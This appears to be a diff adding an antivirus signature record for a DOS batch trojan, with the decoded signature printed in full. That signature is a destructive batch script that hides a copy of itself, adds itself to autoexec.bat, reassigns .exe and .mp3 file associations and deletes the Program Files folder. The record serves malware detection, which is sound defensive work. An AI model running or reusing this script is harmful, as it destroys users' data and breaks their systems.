@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36635
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off echo flick loading... date 11.01.11 copy %0 c:ski.bat attrib +h c:ski.bat echo c:ski.bat >>autoexec.bat :abc md pridurok md luzer md durak ( ) md lamer md soso md laban assoc .exe=.mp3 assoc .mp3=.swf del c:program files/ echo virus load... you lost your life!!!
